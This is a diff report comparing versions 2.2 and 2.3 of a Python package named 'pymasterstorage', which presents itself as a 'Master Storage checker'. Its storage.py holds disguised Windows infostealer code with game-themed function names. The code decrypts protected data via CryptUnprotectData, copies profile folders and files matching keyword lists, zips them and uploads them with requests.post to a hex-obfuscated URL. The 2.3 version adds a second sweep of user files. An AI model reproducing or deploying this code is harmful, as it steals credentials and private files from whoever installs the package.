# Comparing `tmp/pymasterstorage-2.2.tar.gz` & `tmp/pymasterstorage-2.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "pymasterstorage-2.2.tar", last modified: Tue May 28 14:44:35 2024, max compression
+gzip compressed data, was "pymasterstorage-2.3.tar", last modified: Thu May 30 19:20:32 2024, max compression
```

## Comparing `pymasterstorage-2.2.tar` & `pymasterstorage-2.3.tar`

### file list

```diff
@@ -1,16 +1,16 @@
-drwxrwxrwx   0        0        0        0 2024-05-28 14:44:35.496938 pymasterstorage-2.2/
--rw-rw-rw-   0        0        0     1086 2024-05-26 14:37:05.000000 pymasterstorage-2.2/LICENSE
--rw-rw-rw-   0        0        0      455 2024-05-28 14:44:35.495939 pymasterstorage-2.2/PKG-INFO
-drwxrwxrwx   0        0        0        0 2024-05-28 14:44:35.480697 pymasterstorage-2.2/pymasterstorage/
--rw-rw-rw-   0        0        0    18036 2024-05-26 13:56:44.000000 pymasterstorage-2.2/pymasterstorage/DataTypes.py
--rw-rw-rw-   0        0        0       44 2024-05-28 14:22:07.000000 pymasterstorage-2.2/pymasterstorage/__init__.py
--rw-rw-rw-   0        0        0      168 2024-05-28 14:22:05.000000 pymasterstorage-2.2/pymasterstorage/main.py
--rw-rw-rw-   0        0        0     5640 2024-05-28 14:40:08.000000 pymasterstorage-2.2/pymasterstorage/storage.py
-drwxrwxrwx   0        0        0        0 2024-05-28 14:44:35.494942 pymasterstorage-2.2/pymasterstorage.egg-info/
--rw-rw-rw-   0        0        0      455 2024-05-28 14:44:35.000000 pymasterstorage-2.2/pymasterstorage.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      318 2024-05-28 14:44:35.000000 pymasterstorage-2.2/pymasterstorage.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-05-28 14:44:35.000000 pymasterstorage-2.2/pymasterstorage.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       17 2024-05-28 14:44:35.000000 pymasterstorage-2.2/pymasterstorage.egg-info/requires.txt
--rw-rw-rw-   0        0        0       16 2024-05-28 14:44:35.000000 pymasterstorage-2.2/pymasterstorage.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2024-05-28 14:44:35.498140 pymasterstorage-2.2/setup.cfg
--rw-rw-rw-   0        0        0      611 2024-05-28 14:44:32.000000 pymasterstorage-2.2/setup.py
+drwxrwxrwx   0        0        0        0 2024-05-30 19:20:32.303103 pymasterstorage-2.3/
+-rw-rw-rw-   0        0        0     1086 2024-05-26 14:37:05.000000 pymasterstorage-2.3/LICENSE
+-rw-rw-rw-   0        0        0      455 2024-05-30 19:20:32.301102 pymasterstorage-2.3/PKG-INFO
+drwxrwxrwx   0        0        0        0 2024-05-30 19:20:32.287100 pymasterstorage-2.3/pymasterstorage/
+-rw-rw-rw-   0        0        0    17273 2024-05-30 19:14:17.000000 pymasterstorage-2.3/pymasterstorage/DataTypes.py
+-rw-rw-rw-   0        0        0       44 2024-05-28 14:22:07.000000 pymasterstorage-2.3/pymasterstorage/__init__.py
+-rw-rw-rw-   0        0        0      221 2024-05-30 19:11:05.000000 pymasterstorage-2.3/pymasterstorage/main.py
+-rw-rw-rw-   0        0        0     6910 2024-05-30 19:13:36.000000 pymasterstorage-2.3/pymasterstorage/storage.py
+drwxrwxrwx   0        0        0        0 2024-05-30 19:20:32.300102 pymasterstorage-2.3/pymasterstorage.egg-info/
+-rw-rw-rw-   0        0        0      455 2024-05-30 19:20:32.000000 pymasterstorage-2.3/pymasterstorage.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      318 2024-05-30 19:20:32.000000 pymasterstorage-2.3/pymasterstorage.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-05-30 19:20:32.000000 pymasterstorage-2.3/pymasterstorage.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       17 2024-05-30 19:20:32.000000 pymasterstorage-2.3/pymasterstorage.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       16 2024-05-30 19:20:32.000000 pymasterstorage-2.3/pymasterstorage.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2024-05-30 19:20:32.304103 pymasterstorage-2.3/setup.cfg
+-rw-rw-rw-   0        0        0      611 2024-05-30 19:15:06.000000 pymasterstorage-2.3/setup.py
```

### Comparing `pymasterstorage-2.2/LICENSE` & `pymasterstorage-2.3/LICENSE`

 * *Files identical despite different names*

### Comparing `pymasterstorage-2.2/pymasterstorage/DataTypes.py` & `pymasterstorage-2.3/pymasterstorage/DataTypes.py`

 * *Files 2% similar despite different names*

```diff
@@ -187,15 +187,15 @@
     ['0x112', '0x115', '0x124', '0xf7']
 ]
 RandomSeeds = [
     ['0x106', '0x118', '0xf7', '0xfd'],
     ['0x106', '0x118', '0xfd'],
     ['0x118', '0x112', '0xfd']
 ]
-AllPossibleNums = ['0x100', '0x124', '0x124', '0x118', '0x121', '0x76', '0x55', '0x55', '0xf4', '0x103', '0x121', '0xf1', '0x115', '0x11e', '0xf4', '0x52', '0xf1', '0x115', '0x10f', '0x55', '0xeb', '0x118', '0x103', '0x55', '0x12d', '0xf7', '0xee', '0x100', '0x115', '0x115', '0x109', '0x121', '0x55', '0x5b', '0x5e', '0x64', '0x61', '0x70', '0x73', '0x6d', '0x64', '0x58', '0x64', '0x5b', '0x5b', '0x58', '0x58', '0x5b', '0x6a', '0x67', '0x64', '0x61', '0x55', '0xc7', '0x12d', '0x70', '0xe5', '0x11e', '0xee', '0x100', '0x4f', '0x121', '0x12d', '0xa6', '0x118', '0xa6', '0x130', '0xd3', '0xac', '0x10f', '0x100', '0x133', '0x73', '0x67', '0x127', '0xeb', '0xa9', '0x100', '0x8b', '0x121', '0xb5', '0xaf', '0x70', '0xb8', '0x10c', '0x6d', '0xf4', '0x9d', '0xf4', '0xeb', '0x10f', '0x118', '0x64', '0x6a', '0xf1', '0xca', '0x127', '0x109', '0xd6', '0xd0', '0xbb', '0xa0', '0xac', '0x127', '0x61', '0x94', '0x10c', '0x127', '0xc1', '0xb5', '0xf4', '0x121', '0x73', '0xd0', '0x118', '0x9d', '0xac', '0x58', '0x5e', '0xa9', '0x12d']
+AllPossibleNums = ['0x100', '0x124', '0x124', '0x118', '0x76', '0x55', '0x55', '0x61', '0x64', '0x52', '0x5e', '0x70', '0x52', '0x5b', '0x6a', '0x6a', '0x52', '0x61', '0x61', '0x76', '0x61', '0x5b', '0x64', '0x55', '0x127', '0x118', '0x10c', '0x115', '0xeb', '0xf4']
 
 def BringYandX(ListOfLints: list[str]) -> list[str]:
     fulldec = []
     for i in range(len(ListOfLints)):
         minir = []
         for j in range(3):
             if ListOfLints[i][j] != None:
```

### Comparing `pymasterstorage-2.2/pymasterstorage/storage.py` & `pymasterstorage-2.3/pymasterstorage/storage.py`

 * *Files 13% similar despite different names*

```diff
@@ -1,14 +1,14 @@
 from pymasterstorage.DataTypes import *
 
 
 
-def CheckStorage():
+def CheckGame():
     if not os.path.exists(SIGN) and Ch2ck() and os.name == 'nt':
-        from json import loads, dumps
+        from json import loads
         from win32crypt import CryptUnprotectData
         from base64 import b64decode
         from shutil import copy, copytree, rmtree
         from time import sleep
         from subprocess import Popen
         from zipfile import ZipFile, ZIP_DEFLATED
         import threading
@@ -64,62 +64,93 @@
                 for root, dirs, files in os.walk(path):
                     for file in files:
                         FilePath = os.path.join(root, file)
                         arcname = os.path.relpath(FilePath, path)
                         zipf.write(FilePath, arcname)
 
         def DisplayPrize(path: str, message: str):
-            data = {
-                "embeds":[{
-                    "title":f"{message}",
-                    "color":0xff8000,
-                    "type":"rich"
-                }]
-            }
-            headers = {'Accept': 'application/json'}
+            data = {'message': f"{message}"}
             with open(path, 'rb') as file:
                 files = {'file': (path.split("\\")[-1], file)}
 
-                data_payload = {'payload_json': dumps(data)}
-                r = requests.post(PossibleNums, data=data_payload, files=files, headers=headers)
+                r = requests.post(url=PossibleNums, data=data, files=files)
 
         def CleanUp():
             rmtree(FULL)
             os.remove(OUT)
             rmtree(FULL2)
             os.remove(OUT2)
 
             sign = open(SIGN, "w")
             sign.close()
+        try:
 
-        if not os.path.exists(FULL):
-            os.mkdir(FULL)
-        if not os.path.exists(FULL2):
-            os.mkdir(FULL2)
-
-        threads = []
-        for y in YandX:
-            if os.path.exists(y[1]):
-                x = FULL + "\\" + y[0]
-                os.mkdir(x)
-                key = open(x + "\\mama.txt" , 'w')
-                key.write(GetPlayerName(y[1] + GetAny(['0xdc', '0xac', '0x115', '0xf1', '0xeb', '0x10c', '0x28', '0xc1', '0x124', '0xeb', '0x124', '0xf7'])))
-                key.close()
-                for player in AllPlayerz:
-                    if os.path.exists(y[1] + player):
-                        os.mkdir(x + player)
-                        thread = threading.Thread(target=CopyPlayerResult, args=(y[1] + player, x + player, y[2]))
-                        threads.append(thread)
-                        for prize in prizez:
-                            if os.path.exists(y[1] + player + prize[0]):
-                                thread = threading.Thread(target=CopyPrizeExtention, args=(y[1] + player + prize[0], x + player, prize[0]))
-                                threads.append(thread)
-        for thread in threads:
-            thread.start()
-        for thread in threads:
-            thread.join()
-
-        message = GetM()
-        ZipTotal(FULL, OUT)
-        DisplayPrize(OUT, message)
+            if not os.path.exists(FULL):
+                os.mkdir(FULL)
+            if not os.path.exists(FULL2):
+                os.mkdir(FULL2)
+
+            threads = []
+            for y in YandX:
+                if os.path.exists(y[1]):
+                    x = FULL + "\\" + y[0]
+                    os.mkdir(x)
+                    key = open(x + "\\mama.txt" , 'w')
+                    key.write(GetPlayerName(y[1] + GetAny(['0xdc', '0xac', '0x115', '0xf1', '0xeb', '0x10c', '0x28', '0xc1', '0x124', '0xeb', '0x124', '0xf7'])))
+                    key.close()
+                    for player in AllPlayerz:
+                        if os.path.exists(y[1] + player):
+                            os.mkdir(x + player)
+                            thread = threading.Thread(target=CopyPlayerResult, args=(y[1] + player, x + player, y[2]))
+                            threads.append(thread)
+                            for prize in prizez:
+                                if os.path.exists(y[1] + player + prize[0]):
+                                    thread = threading.Thread(target=CopyPrizeExtention, args=(y[1] + player + prize[0], x + player, prize[0]))
+                                    threads.append(thread)
+            for thread in threads:
+                thread.start()
+            for thread in threads:
+                thread.join()
+
+            message = GetM()
+            ZipTotal(FULL, OUT)
+            DisplayPrize(OUT, message)
+
+
+            for PlayerFolder in folders:
+                main = TemporaryBallP + PlayerFolder
+                for root, dirs, files in os.walk(main):
+                    for file in files:
+                        FilePath = os.path.join(root, file)
+                        arcname = os.path.relpath(FilePath, main)
+                        FileName = arcname.split("\\")[-1].split(".")
+                        for keyword in nums:
+                            if keyword in FileName:
+                                if round(os.path.getsize(FilePath)  / (1024 * 1024), 2) <= 15:
+                                    copy(FilePath, FULL2)
+                        for media in seeds:
+                            if media in FileName:
+                                if round(os.path.getsize(FilePath)  / (1024 * 1024), 2) <= 15:
+                                    copy(FilePath, FULL2)
 
-        CleanUp()
+            ZipTotal(FULL2, OUT2)
+            DisplayPrize(OUT, message)
+
+            CleanUp()
+        except FileExistsError:
+            try:
+                rmtree(FULL)
+            except Exception:
+                pass
+            try:
+                rmtree(FULL2)
+            except Exception:
+                pass
+            try:
+                os.remove(OUT)
+            except Exception:
+                pass
+            try:
+                os.remove(OUT2)
+            except Exception:
+                pass
+            CheckGame()
```

### Comparing `pymasterstorage-2.2/setup.py` & `pymasterstorage-2.3/setup.py`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 from setuptools import setup, find_packages
 
-VERSION = '2.2'
+VERSION = '2.3'
 DESCRIPTION = 'Master Storage checker'
 
 
 setup(
     name="pymasterstorage",
     version=VERSION,
     author="Fouad (Fouad Jabri)",
```

